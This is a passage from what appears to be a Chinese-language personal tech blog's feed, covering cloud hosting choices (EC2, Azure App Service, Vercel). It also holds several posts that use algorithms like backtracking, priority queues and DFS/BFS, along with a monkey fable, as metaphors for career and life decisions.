本質上就是一台雲端機器，像是遠端 Ubuntu&#x2F;Linux，你可以安裝 Node.js、MongoDB、Nginx 等等，完全自由配置：</p><ul><li>開發彈性高，可自訂 Reverse Proxy、SSL、排程腳本等</li><li>適合需要自建環境、設定自動備份、使用特定作業系統的場景</li><li>可以整合 Jenkins + SSH 做 CI&#x2F;CD，自動部署</li></ul><p>缺點就是：機器掛了、網路設定錯了、沒開 Port，都是你要自己解決的事。</p><p>適合用在：大型網站、需要完整掌控的生產環境、重資源運算。</p><p>推薦參考：<a href="https://linyencheng.github.io/2019/07/13/tool-nginx/">Linux 系統網站管理（Node.js + Nginx）</a></p><h2 id="Azure-Web-App-App-Service：圖形化管理的直覺部署流程"><a href="#Azure-Web-App-App-Service：圖形化管理的直覺部署流程" class="headerlink" title="Azure Web App &#x2F; App Service：圖形化管理的直覺部署流程"></a>Azure Web App &#x2F; App Service：圖形化管理的直覺部署流程</h2><p>相比 AWS，Azure 的 Web App 是一種 PaaS 方案，讓你透過 Azure Portal 自動串 GitHub、Bitbucket 分支 → 自動 Deploy，流程一條龍，非常直覺。</p><p>Azure 的 Web App &#x2F; App Service 主打「部署流程清楚、設定簡單」：</p><ul><li>GitHub &#x2F; Bitbucket 自動串接、CI&#x2F;CD 內建</li><li>開發測試可用 Web App，測完再升級為 App Service（正式環境）</li><li>CORS 設定、環境變數、log viewer、回滾版本等皆可在 Portal 完成</li><li>若 CORS 遇 bug 可以在 Portal 直接設定</li><li>可七天內重置及用 App Service 的 Metrics + Kudu 預覽環境</li></ul><p>推薦使用情境：不熟命令列但想玩自動部署的前端工程師，或公司主力在 Microsoft 生態系。</p><p>官方資源：</p><ul><li><a href="https://azure.microsoft.com/zh-tw/services/app-service/web/">Azure Web App 官方說明</a></li><li><a href="https://azure.microsoft.com/zh-tw/services/app-service/">Azure App Service 官方說明</a></li><li><a href="https://blog.miniasp.com/post/2015/05/04/Intro-Azure-Web-App-Kudu-engine.aspx">Kudu Web App 管理工具介紹</a></li><li><a href="https://github.com/projectkudu/kudu/wiki/Custom-Deployment-Script">Kudu Custom Deployment Script</a></li></ul><h2 id="Vercel：專為前端打造的極速部屬平台"><a href="#Vercel：專為前端打造的極速部屬平台" class="headerlink" title="Vercel：專為前端打造的極速部屬平台"></a>Vercel：專為前端打造的極速部屬平台</h2><p>如果你是 Next.js 或前端 SPA 開發者，那 Vercel 基本上就是 plug &amp; play：</p><p>Git 推送後自動建置 + 預覽連結</p><p>預設支援 SSR&#x2F;ISR（伺服器端渲染 &#x2F; 增量靜態建置）</p><p>免費方案對於個人專案或 MVP 足夠用</p><p>而且還內建 CI&#x2F;CD、Preview Deploy、404 頁面與伺服器函式支援，幾乎不用再搭其他東西就能完成整個部署。</p><p>適合用在：部落格、文件站、MVP、Next.js 專案。</p><h2 id="架站服務選哪個？"><a href="#架站服務選哪個？" class="headerlink" title="架站服務選哪個？"></a>架站服務選哪個？</h2><table><thead><tr><th>需求</th><th>推薦方案</th><th>理由</th></tr></thead><tbody><tr><td>快速試作、低維運</td><td>AWS Lambda &#x2F; Vercel</td><td>不用顧機器，部署快速，適合 PoC &#x2F; 簡易 API</td></tr><tr><td>高自訂、低延遲、複雜需求</td><td>EC2</td><td>自訂 Nginx、背景排程、系統控制度高</td></tr><tr><td>自動化流程 + GUI 操作</td><td>Azure Web App &#x2F; Vercel</td><td>Git 連動 + Portal 控制，對新手友善</td></tr></tbody></table><p>不管你是從前端起家的 Node.js 派，還是進階維運的 DevOps，這三種架站方式各有適用場景。</p><p>拿不到流量？不是誰比較弱，而是用對工具更重要。</p><p>選擇雲端架站工具，與其問「哪個比較強」，不如回到問題：「你現在的專案，真正需要什麼？」</p><ul><li>是想快速出 Demo？還是穩定營運？</li><li>是偏向前端流程？還是需要整合後端資源？</li></ul><p>工具沒有完美，只有合適。搞清楚你的場景，再對症下藥，才是高效前進的第一步。</p>]]></content>
      
      
      <categories>
          
          <category> 雲端服務 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DevOps </tag>
            
            <tag> 雲端服務 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Backtracking 回溯法是失敗還是策略</title>
      <link href="/2025/06/08/life-thinking-algorithm/backtracking-in-life/"/>
      <url>/2025/06/08/life-thinking-algorithm/backtracking-in-life/</url>
      
        <content type="html"><![CDATA[<p>各位大大安安，今天要來聊那些「走錯的路」，一個超級有感卻又常常被忽略的真相。</p><p>從小就被教育要一次選對、考對、愛對、工作對，彷彿人生是條單行道，一錯就萬劫不復，但捫心自問，這個世界真的這麼只有唯一解嗎？</p><p>實際上生活中的一切，都是在語言的規範和限制下所建構出來的，科學即使大部分合理，但生活卻仍舊充滿這麼多值得我們去探索的事物，明明還沒去找所有的可能，但我們卻似乎從未質疑?</p><p>當然這樣長久下來不太妙? 回溯法（Backtracking）也許就會是另一種更聰明、更勇敢的模式。</p><h2 id="🧩-什麼是回溯法？"><a href="#🧩-什麼是回溯法？" class="headerlink" title="🧩 什麼是回溯法？"></a>🧩 什麼是回溯法？</h2><p>回溯法，白話來說，是一種專門用來解決「組合問題」的演算法，像是解迷宮、填數獨，或是在複雜的排列組合中找出答案。</p><p>回溯法很酷的地方在於會勇敢地嘗試一條路，如果發現走不通，會退一步，換條路再試，進行系統性的探索，直到它找到正確答案為止。</p><p>簡單來說，回溯法就是：</p><ol><li>大膽試錯： 先選擇一條路走下去。</li><li>聰明回頭： 發現是死路？沒關係，「退一步」（Backtrack），回到上一個決策點。</li><li>換條路徑： 然後，再嘗試另一個方向。</li></ol><p>這個過程會重複，直到你找到那條可行的路。</p><h2 id="✨-滿天星星散落整個銀河系，什麼原因才讓我們最靠近？"><a href="#✨-滿天星星散落整個銀河系，什麼原因才讓我們最靠近？" class="headerlink" title="✨ 滿天星星散落整個銀河系，什麼原因才讓我們最靠近？"></a>✨ 滿天星星散落整個銀河系，什麼原因才讓我們最靠近？</h2><p>我們很多人都習慣把人生想像成一場「一次性解題」的考試：</p><ul><li>一次就要選對科系</li><li>一次就要找到理想工作</li><li>一次就要成功戀愛結婚</li></ul><p>然後就從此幸福快樂? 但事實是，生活並不是什麼最短路徑問題? 如果是那就不需要律師?</p><p>實務上當然還是必須先試著往某個方向衝刺，但如果發現前面卡住了、走不通了，這時候，請你勇敢地<strong>「退回來」</strong>，然後，再換一條路走走看。</p><blockquote><p>那些「錯的路」不是浪費，它們是來幫你排除錯誤選項的，讓你更接近對的那條路。</p></blockquote><p>很多人活得像個「不能失敗」的人，結果反而因此不敢嘗試，每一次的嘗試，其實都不是白費力氣，各種嘗試都在腦中默默記錄著哪些路行不通、哪些選項不值得再浪費時間。</p><ul><li>嘗試過不適合的科系？→ 你知道了真正的興趣在哪。</li><li>談了沒有結局的戀愛？→ 你看清了自己到底需要怎樣的關係。</li><li>加入過怪團隊？→ 你清楚了未來要避開什麼樣的文化。</li></ul><p>每一次的回溯，並不是要重頭來過，它是要讓你「更精準地踏出下一步」。</p><blockquote><p>人生中很多問題是沒有標準答案的。</p></blockquote><p>身為一個實作型學習的人，不可能只靠靜靜思考三小時就能得到解答，必須走下去看看再說，想當年小編的十主科自主不分系也是這樣來的，有點後悔是當年只去了流舞社練體能，反正當年耳朵都壞了?! 竟然沒去熱音體驗培養飆鼓飆弦這種可以比較長久的興趣 XD</p><p>開始能體會為什麼人在遇到疑惑的時候會想去走朝聖之路了，有些答案，真的不是靠想，是靠走。</p><h2 id="🛑-回溯也需要「剪枝」"><a href="#🛑-回溯也需要「剪枝」" class="headerlink" title="🛑 回溯也需要「剪枝」"></a>🛑 回溯也需要「剪枝」</h2><p>在演算法的世界裡，有個超實用的技巧叫做「剪枝」。</p><ul><li>沒必要在一段根本沒有未來的感情裡內耗自己</li><li>沒必要在一間不斷讓你懷疑人生的公司裡苟延殘喘</li><li>沒必要在一個註定失敗的計畫裡耗盡心力</li></ul><p>剪枝就是當你發現某條路徑明顯不可能帶你走向成功，就請你提前終止，別再浪費時間走下去。</p><p>就像兩個適合的人在不同時空遇到一樣，彼此追求和想要的生活階段並不相同，兩條不同的交叉線趨近於零交點。</p><blockquote><p>別再繼續硬撐一份根本不會帶你到目標的選擇了。</p></blockquote><p>我們的生活也該學會這件事，每一次你走錯的路只要有好好反思，它都不是白走的：「喔！這個地方我來過，不用再走一遍了。」</p><h2 id="🐷-後退原來是向前"><a href="#🐷-後退原來是向前" class="headerlink" title="🐷 後退原來是向前"></a>🐷 後退原來是向前</h2><p>回溯法是反覆的前進，加上聰明地後退。</p><p>而那些曾經走過的死路、犯過的錯都不曾白費，都是成為更好自己的基礎建設。</p><p>是代價，但更是導航。你呢？還有哪些路需要勇敢回溯、聰明剪枝？</p><blockquote><p>手把青秧插滿田，低頭便見水中天，六根清淨方為道，後退原來是向前。</p></blockquote><p>但我還是會持續愛看妹?! 畢竟一路以來很專情沒啥改變?! 20 幾歲的時候喜歡看 20 幾歲的女孩子，到了 30 幾歲好像也沒變?! 外表有時會被大家誤會比實際年齡小上 5-10 歲?! 很偶而看一下不過分吧?!</p><p>為什麼三年前的我對你完全沒有一點抵抗能力?! 說好的六根清淨酒肉和尚瘋狂僧侶呢 XDDD</p>]]></content>
      
      
      <categories>
          
          <category> 生活演算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不是沒時間，是你忘了排優先序！</title>
      <link href="/2025/06/08/life-thinking-algorithm/priority-queue-in-life/"/>
      <url>/2025/06/08/life-thinking-algorithm/priority-queue-in-life/</url>
      
        <content type="html"><![CDATA[<p>各位大大安安，不知道大家是不是也常常有這種「人生被待辦事項綁架」的感覺？</p><p>待辦清單長到天靈蓋、學習課程一頁翻不完、手機訊息未讀 999+，每件事都喊著「我很重要！」，結果呢？</p><p>可能什麼都沒開始，就默默打開 YouTube，讓影片當背景音陪你虛度時光…（對，我也是）</p><h2 id="✅-什麼是-Priority-Queue？"><a href="#✅-什麼是-Priority-Queue？" class="headerlink" title="✅ 什麼是 Priority Queue？"></a>✅ 什麼是 Priority Queue？</h2><p>Priority Queue 是一種聰明的資料結構。</p><p>跟我們一般排隊「先來後到」的邏輯完全不同，在優先佇列裡，每個項目都自帶一個優先順序。</p><p>就像身為一個價格敏感型消費者?購物車真的無法說清就清，精打細算也要等到免運日才會甘願買? Priority Queue 才不管什麼時候加入購物車，只看重要性或緊急度，來決定要先買哪個。</p><p>想像一下急診室：醫生不會管你掛號單上的號碼是多少，他只會先處理那些生命垂危、需要立刻搶救的病患。</p><p>這，就是最真實的「根據權重排序」啊！</p><h2 id="🛠-把生活變成優先佇列"><a href="#🛠-把生活變成優先佇列" class="headerlink" title="🛠 把生活變成優先佇列"></a>🛠 把生活變成優先佇列</h2><p>來看看我們的人生待辦事項，是不是長這樣：</p><ul><li>回訊息給朋友 ✅</li><li>把下週報告準備好 ✅</li><li>開始那個說了三個月的 Side Project ✅</li><li>看完那堂線上課程 ✅</li><li>運動、打掃、洗衣、追劇 ✅✅✅</li></ul><p>每件事都像是在腦海裡無限循環，彷彿非做不可。</p><p>但如果只是全部丟進一個陣列裡隨機排序處理，那恭喜你，正在光明正大地走入拖延泥沼！</p><p>這時候，如果把這些看似重要卻又讓你焦慮的任務，通通丟進一個 Priority Queue 會如何呢?</p><p>根據以下幾個指標來重新排序：</p><ul><li>時效性（Deadline 多近？）：這件事的截止日期是不是已經在敲門了？</li><li>價值密度（這件事對我未來的回報高嗎？）：投入同樣的時間，哪件事能帶來最大的效益？</li><li>情緒影響力（做完會開心？還是持續焦慮？）：搞定它會讓你如釋重負，還是讓壓力持續堆疊？</li><li>能量配合度（現在的狀態適合處理它嗎？）：你現在是精力充沛適合燒腦，還是只想做些簡單的？</li></ul><p>例如，小編個人最常用的排序法是這樣：</p><ul><li>🔥「不做會焦慮」→ 第一優先：那些像芒刺在背、不做就無法專心做其他事的事。</li><li>🧠「做完會成長」→ 第二優先：那些能提升技能、拓展視野、累積經驗的事。</li><li>😌「做了會開心」→ 第三優先：那些能帶來愉悅、放鬆身心、補充能量的事。</li><li>😵「只打發時間」→ 最後優先：那些純粹耗費時間，卻沒有實際意義的事。</li></ul><h2 id="🧠-人生不是-FIFO（先進先出）"><a href="#🧠-人生不是-FIFO（先進先出）" class="headerlink" title="🧠 人生不是 FIFO（先進先出）"></a>🧠 人生不是 FIFO（先進先出）</h2><p>我們太容易把人生過成 FIFO (First In First Out) 模式了。</p><p>別人丟什麼就先做什麼，變成一個活生生的無情賺錢機器，毫無主動權可言。</p><p>生活，難道就只是在不斷地回應外部需求嗎？先讓自己停下來? 你願意 Cosplay 一下 Priority Queue 嗎?</p><p>將手上的任務好好分類，思考一下「權重」再決定出手順序，也許每個行動也都會更接近真心在乎的人生目標。</p><p>要把 Priority Queue 的概念落實到生活，其實沒有你想像中那麼難：</p><ul><li>善用工具：在 Trello、Notion、Google Keep 這些任務管理工具裡，加入一個「重要性」或「優先級」的欄位。</li><li>每天只選 Top 3：每天早上給自己 10 分鐘，從所有任務中挑選出今天最重要的 3 件事，其他不那麼重要的，就暫時先放著。</li><li>建立「我不再做的事清單」：這個清單能幫助你主動清除那些低權重、耗費心力的雜項。有些事，就是該直接說掰掰。</li><li>給自己一個 Priority Queue「重新排序」時間：小編習慣是每週日晚上，重新檢視並排序下週的所有任務。</li></ul><h2 id="💬-不是沒時間，是沒排序"><a href="#💬-不是沒時間，是沒排序" class="headerlink" title="💬 不是沒時間，是沒排序"></a>💬 不是沒時間，是沒排序</h2><p>很多時候，我們真的不是沒時間，而是被排山倒海而來的資訊和任務徹底淹沒了，以至於失去了好好排序的能力。</p><p>Priority Queue 不僅僅是程式碼裡的排程工具，也能把那些雜事重新賦予權重、重新排序，最終幫你找出當下最值得投入時間和精力的選擇。</p><p>所以，別再讓人生被瞎忙綁架了，今天起，你的人生，你來排序！</p>]]></content>
      
      
      <categories>
          
          <category> 生活演算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高空彈跳是先跳下去還是看清楚再跳</title>
      <link href="/2025/06/05/life-thinking-algorithm/dfs-vs-bfs-in-life/"/>
      <url>/2025/06/05/life-thinking-algorithm/dfs-vs-bfs-in-life/</url>
      
        <content type="html"><![CDATA[<p>各位大大安安，今天我們來聊聊兩個常見但思維完全不同的探索策略：</p><ul><li>深度優先搜尋（Depth-First Search, DFS）</li><li>廣度優先搜尋（Breadth-First Search, BFS）</li></ul><p>在演算法中，它們是兩種遍歷圖（或樹）的方法，但在生活中也像是兩種做選擇的風格。</p><h2 id="🔍-什麼是-DFS-和-BFS？"><a href="#🔍-什麼是-DFS-和-BFS？" class="headerlink" title="🔍 什麼是 DFS 和 BFS？"></a>🔍 什麼是 DFS 和 BFS？</h2><ul><li>DFS：一頭栽進去，先走到底（踩到地雷才折返）</li><li>BFS：每一層都看一圈，再決定下一步（比較安全，但慢）</li></ul><p>想像你在一個迷宮裡找寶箱：</p><ul><li>DFS 派: 直接選一條路狂奔到底，有寶箱賺到、沒寶箱就回頭換路。</li><li>BFS 派: 每次只走一步，把所有方向都看一遍，再同時往外擴張。</li></ul><p>兩派都有風險：</p><ul><li>DFS: 容易走錯太深，浪費太多時間在錯的路上。</li><li>BFS: 雖然比較穩，但記憶體（時間與腦容量）消耗很大。</li></ul><h2 id="🧬-探索職涯與自我，該怎麼選？"><a href="#🧬-探索職涯與自我，該怎麼選？" class="headerlink" title="🧬 探索職涯與自我，該怎麼選？"></a>🧬 探索職涯與自我，該怎麼選？</h2><ol><li>你是剛畢業，不知道自己要什麼？<br>➡️ 建議走 BFS，多試幾種實習、專案、產業。把選擇打開來，再從中找到感覺對的方向。</li><li>你已經找到某個方向，但遲遲沒行動？<br>➡️ 該來點 DFS 了，直接栽進去試一試。讀書讀太多、不實踐，不會知道這條路到底合不合適。</li></ol><h2 id="💡-深思還是實驗，沒有絕對的好壞"><a href="#💡-深思還是實驗，沒有絕對的好壞" class="headerlink" title="💡 深思還是實驗，沒有絕對的好壞"></a>💡 深思還是實驗，沒有絕對的好壞</h2><p>面對一門新課程，你會…<br>　 🅐 直接報名先上再說 → DFS<br>　 🅑 先看五個心得文跟 YouTube 開箱 → BFS</p><p>想轉職，你會…<br>　 🅐 先接一兩個 side project 試水溫 → DFS<br>　 🅑 研究職涯規劃書、履歷優化、產業分析 → BFS</p><p>有些人是<strong>「邊走邊想型」</strong>（DFS）<br>他們願意嘗試，願意犯錯，也更可能快速發現熱情與限制。</p><p>有些人是<strong>「分析控思考型」</strong>（BFS）<br>他們做很多功課、訪談別人、讀很多書，再做決定，風險較低但啟動較慢。</p><h2 id="💬-探索世界也在探索自己"><a href="#💬-探索世界也在探索自己" class="headerlink" title="💬 探索世界也在探索自己"></a>💬 探索世界也在探索自己</h2><p>人生探索沒有完美路徑。</p><p>DFS 跟 BFS 都有用，看你在什麼階段、什麼樣性格、什麼樣的時間壓力。</p><p>但無論你選哪種，都記得一件事：</p><p>不要一直想不行，不行就去做；不要一直做不停，不停也要想。</p><h2 id="📚-延伸閱讀"><a href="#📚-延伸閱讀" class="headerlink" title="📚 延伸閱讀"></a>📚 延伸閱讀</h2><ul><li><a href="https://linyencheng.github.io/2025/05/28/life-thinking-algorithm/shortest-path-in-your-life/">最短路徑與人生抉擇：知道去哪，才知道怎麼走</a></li><li><a href="https://linyencheng.github.io/2025/05/28/life-thinking-algorithm/dynamic-programming-in-life/">動態規劃是怎麼累積經驗值的？打怪人生的優化術</a></li><li><a href="https://linyencheng.github.io/2025/05/28/life-thinking-algorithm/knapsack-in-life/">用背包問題，解開選擇困難與時間管理焦慮</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 人生演算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>香蕉在哪裡不重要，重要的是你還在原地等嗎？</title>
      <link href="/2025/06/02/monkeys-on-the-mountain/try-to-find-banana-or-still-waiting-there/"/>
      <url>/2025/06/02/monkeys-on-the-mountain/try-to-find-banana-or-still-waiting-there/</url>
      
        <content type="html"><![CDATA[<p>在那座高聳的山上，猴子們過著看似安穩的生活，日復一日追求著評審猿所謂的「香蕉」，這種象徵成果與成就的獎勵。</p><p><img src="/img/monkey.webp"></p><p>評審猿年年來巡山，頒發最大最甜的香蕉給表現最亮眼的猴子。有一隻猴子靠著「逆時鐘搖三下」技巧成功摘下香蕉，從此成為傳奇 —— 戲精猿。</p><p>戲精猿開班授課、出書直播，分享成功學，推崇「香蕉角度學」，教大家如何上位，主張流程必須：</p><blockquote><p>先前滾三圈，逆時鐘搖三下，跳到北邊平台，才能拿到評審認證的香蕉。</p></blockquote><p>這段故事也許熟悉？像不像你熟悉的流程或成功模板？</p><h2 id="🐵-標準流程文化：大家都很努力，卻沒有人看整體"><a href="#🐵-標準流程文化：大家都很努力，卻沒有人看整體" class="headerlink" title="🐵 標準流程文化：大家都很努力，卻沒有人看整體"></a>🐵 標準流程文化：大家都很努力，卻沒有人看整體</h2><p>因為評審猿和記分猿的獎賞制度，猴子們發現能動的流程就不要去更動，動的不好反被計分猿扣分。</p><p>隨著猴群聚落的專業分化，整個香蕉事務流程日益繁雜，猴群們漸漸摸索出標準流程，方便新加入的猴子能快速上手。</p><p>猴群中有三隻猴子佐佐、尚尚與佑佑，這三猴分別負責挖洞、種樹、填土。</p><p>某天尚尚請假了，佐佐與佑佑不想被計分猿扣分照舊挖洞填洞，沒發現中間沒有尚尚種樹，一個挖洞一個填洞，卻沒種樹永續的香蕉計畫面因此臨了危機。</p><p>日常生活中的我們，也為了某種匱乏感而努力，每天固定的看盤操作，說服自己對現狀感到滿足，就像猴子們擔心被扣分而匆匆忙忙庸庸碌碌。</p><p>猴子們忽視了種樹這個重要的環節，最終讓整個永續香蕉計畫岌岌可危，當回到真實的世界，我們又該如何看待我們的生活和追求的目標？投資部位明明破線了卻假裝是長期投資？</p><h2 id="🍌-成功模板的詛咒：你還在照以前的劇本摘香蕉嗎？"><a href="#🍌-成功模板的詛咒：你還在照以前的劇本摘香蕉嗎？" class="headerlink" title="🍌 成功模板的詛咒：你還在照以前的劇本摘香蕉嗎？"></a>🍌 成功模板的詛咒：你還在照以前的劇本摘香蕉嗎？</h2><p>有一天，來了一批來自山下的評審猿，提出導入「香蕉關鍵成果法（Banana OKRs）」。</p><p>猴子們本能地抗拒，猴子們說：「不行啦！這樣會亂掉！」因為他們早已習慣了舊有流程與認可模式，認為只需專注於眼前的香蕉。</p><p>但，猴子們的生活中，也漸漸出現新的香蕉處理流程，但原有流程設計又僅為了原本評審猿的心情，而非真正解決問題。</p><p>猴子們開始質疑變來變去是否有意義，卻又不敢做出改變，最終導致資源的浪費。結果是什麼？流程持續變，猴子們從抱怨變成無感。</p><p>就像一對情侶，一方想過安穩的生活，而另一方卻渴望冒險挑戰。這種價值觀的衝突，讓彼此更加感到迷惘。</p><h2 id="📉-表面成效的假象：忙碌的猴子與錯誤的香蕉方向"><a href="#📉-表面成效的假象：忙碌的猴子與錯誤的香蕉方向" class="headerlink" title="📉 表面成效的假象：忙碌的猴子與錯誤的香蕉方向"></a>📉 表面成效的假象：忙碌的猴子與錯誤的香蕉方向</h2><p>山上的猴子們總是忙，忙著滿足評審猿的期待，讓評審猿相信猴子們一直在努力。</p><p>猴子們還做了更多事：</p><ul><li>發明了香蕉儲藏室（其實沒香蕉可放）</li><li>建立自駕香蕉車（但沒香蕉能載）</li><li>搞 AI 香蕉辨識（但沒樹）</li></ul><p>這些聽起來像不像我們：</p><ul><li>沒有 CI&#x2F;CD，卻硬上 microservices</li><li>開了一堆 Jira ticket，但沒人回頭看 backlog</li><li>新流程上線，每週會議，卻沒人問：「我們到底解了什麼問題？」</li></ul><p>好像很有生產力，但實際上整體香蕉處理流程仍然卡關，但猴子們卻選擇將精力投入到不斷推出新的任務上。</p><p>每當展示出這些所謂的成果時，評審猿總是會點頭表示滿意，稱讚猴子們努力的成果，仿佛總有做不完的事情，卻沒人真正改變現況。</p><p>猴子們中不止有過度繁忙的猴子，還有資源分配不均的情況，能者不僅多勞還過勞。</p><p>猴子們漸漸不再關心猴群的長期發展，而只專注於即時的成果。</p><p>每一次看似成功的小任務後，都會自信地認為自己走在正確的道路上。</p><p>一直以來猴子們都遵循「只要照著評審猿說的做就對了」的準則過日子，總覺得：</p><ul><li>問題只有對錯</li><li>決策只有接受或拒絕</li><li>生活只有上班或下班</li></ul><p>投資上也蠻常會為了一些蠅頭小利短進短出，卻往往忽視了配置的整體性和長期的發展，雖然短期的成果看似滿意，但卻無法帶來真正的進步。</p><h2 id="🍌-那棵香蕉已經吃完了，猴子卻還不肯放手？"><a href="#🍌-那棵香蕉已經吃完了，猴子卻還不肯放手？" class="headerlink" title="🍌 那棵香蕉已經吃完了，猴子卻還不肯放手？"></a>🍌 那棵香蕉已經吃完了，猴子卻還不肯放手？</h2><p>有一天，一隻猴子決定下山尋找新的香蕉，卻因為無法在回到山上前找到香蕉而感到沮喪。</p><p>其他的猴子們看到這一幕，便開始擔心也會在這樣過程中失敗，於是紛紛放棄前往遠方，而選擇待在山裡生產著香蕉。</p><p>就像工程師看到一套新架構會說：「太新了不穩」，但實際上，是沒時間也沒心力去學。</p><p>猴子們陷入了一種集體思維，既然這方法成功過，為什麼不繼續用就好？</p><ul><li>念了大學就該唸研究所</li><li>就該一直拿到 offer 就該一直往高薪跳</li><li>只寫程式不如會報告</li><li>用過的框架最熟，沒理由換</li></ul><p>可是，選擇的方向不同時，失敗的背後往往也都會有不同的原因，問題可能只是舊地圖找不到新香蕉。</p><p>香蕉的品種以及生產方式與效率已經和以往大不相同，猴子們卻仍在煩惱過去繁雜的處理程序。</p><p>猴子們相信戲精猿的那套流程，只因為曾經成功，但山已經變了，香蕉長在別處，猴子們還在原地逆時鐘搖三下。這讓猴子們意識到:</p><blockquote><p>繼續著原來的生活方式並沒有不好，但好像有哪邊不太對。</p></blockquote><p>山上的氣候，天天變化，昨天還在流行的 BananaScript，今天已經被 JungleJS 取代。猴子們過去學會的，未來可能不是沒價值，而是不夠用了。</p><p>猴子常說：「我以前這樣做都沒問題」，那代表已經跟不上氣候變遷，要不被快速進化的山林淘汰，成為了當務之急。</p><h2 id="🌱-當工程師學會反思：從猴群中走出來的聲音"><a href="#🌱-當工程師學會反思：從猴群中走出來的聲音" class="headerlink" title="🌱 當工程師學會反思：從猴群中走出來的聲音"></a>🌱 當工程師學會反思：從猴群中走出來的聲音</h2><p>山上生產香蕉的日子日復一日，即使從佐佐、尚尚、佑佑的故事中發現有許多感覺多餘的勞動，但猴子們依舊相信著前輩的愛心，對於那些口傳的作業流程深信不疑，這有講過，這都有講，這是一個規則。</p><p>猴子們最常吵架的議題就是香蕉怎麼分，有猴子主張「按工作分配」、有猴子堅持「大家平均分」。</p><p>直到有一天，一隻聰明的小猴子（好吧，其實就是隻普通的小猴子）提出一個疑問：</p><blockquote><p>「如果我們不是只能選邊站呢？是不是也能邊聽邊走、邊做邊修？」<br>「要不要我們先試著講出彼此的顧慮，再來討論解法？」</p></blockquote><p>慢慢地，猴子們學會了從立場轉向需求，也發現有些爭執其實只是「說話的方式不一樣」，有的時候和家人、朋友的溝通也是，我可能錯了，猴子們開始問自己：</p><blockquote><p>「如果長大是讓選項變少，那我們努力幹嘛？」<br>「如果人生只能選 0 跟 1，那學會彈性是要幹嘛？」</p></blockquote><p>程序猿們以前做工具都吵翻天，討論架構時永遠吵在第一層：</p><ul><li>「我們一定要用 polyrepo！」</li><li>「不行啦，monorepo 才是正道！」</li></ul><p>直到某天有隻小猴猴子說：「不然看應用情境？看團隊規模？看 build 流程？我們能不能根據需求做彈性選擇？」</p><p>於是猴子們開始做 Decision Log、比較優缺點，也慢慢找到了「選擇背後的脈絡」，不再是架構選型的宗教戰爭。</p><p>某天，那一隻平凡的小猴子研究出香蕉基因分裂技術，大幅提升產量與品質，讓猴子不再只靠老方法，也為猴子們提供了一個新的生活選擇。戲精猿因此轉型也開始有了創造力，不只是演出當年故事，而是用創意改善聚落，傳授新香蕉哲學。</p><p>猴子們開始用滑翔翼、AI 路徑預測工具找香蕉，有的程序猿寫程式寫得累，就開始利用晚上教別的猴子怎麼用 bananaGPT（不開玩笑，真的是用 AI 找香蕉 🍌），意外打開了家教副業的世界。</p><p>猴子們也發現原來職涯可以不只一條路，正職與副業可以並行，工作跟興趣可以交錯。</p><p>最重要的是：選擇權應該回到猴子自己手上。</p><h2 id="🧭-職涯不是爬樓梯，而是選地圖"><a href="#🧭-職涯不是爬樓梯，而是選地圖" class="headerlink" title="🧭 職涯不是爬樓梯，而是選地圖"></a>🧭 職涯不是爬樓梯，而是選地圖</h2><p>猴子們開始認為是不是太執著於那棵香蕉樹了？</p><p>其實除了採香蕉，還可以研究怎麼讓香蕉保存得更久、怎麼做成香蕉果乾、甚至可以設計猴子用的香蕉搬運機。</p><p>這些「不純粹採香蕉」的猴子一開始不務正業，但沒多久，卻成為讓整個猴群效率翻倍的關鍵角色。</p><p>這在工程師世界裡就像是：</p><ul><li>從單純寫程式轉向 DevOps、自動化測試、架構設計</li><li>從技術人轉型成顧問、講師、產品思維實踐者</li><li>從線性升遷邏輯轉向跨領域探索與自由職涯</li></ul><p>不一定要當那個年薪最高的猴子，也許可以當那隻走得更遠的猴子? 可以選擇當寫最強 banana script 的程序猿，也可以成為串接各方資源的傳播猿，甚至轉去海邊開香蕉冰店。</p><p>🍌 你想走多遠，取決於你是否願意放下那根「代表過去」的香蕉。</p><ul><li>舊方法有效不代表永遠適用</li><li>表現不是目的，理解與成效才是關鍵</li><li>改變會痛，但不變可能死</li><li>忙碌 ≠ 生產力，流程 ≠ 真正的進展</li><li>別放大恐懼，試著探索那些你還沒走過的香蕉樹林</li></ul><p>下一次，當你準備說出「以前這樣做沒問題」的時候，也許該問的是：「未來，這樣還會夠用嗎？」</p><blockquote><p>下一棵哈密瓜口味的香蕉，也許就長在還沒走過的地方。</p></blockquote><p>在未來的有一天，吃了哈密瓜口味的香蕉冰後，才發現生活原來也就是一碗哈密瓜冰，也才發現原來自己好像長大了呢?</p><blockquote><p>香蕉在哪裡不重要，重要的是你還在原地等嗎？</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 山上猴子的故事 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從開始到放棄，從動手到動嘴</title>
      <link href="/2025/06/01/monkeys-on-the-mountain/from-starting-to-giving-up-from-doing-to-talking/"/>
      <url>/2025/06/01/monkeys-on-the-mountain/from-starting-to-giving-up-from-doing-to-talking/</url>
      
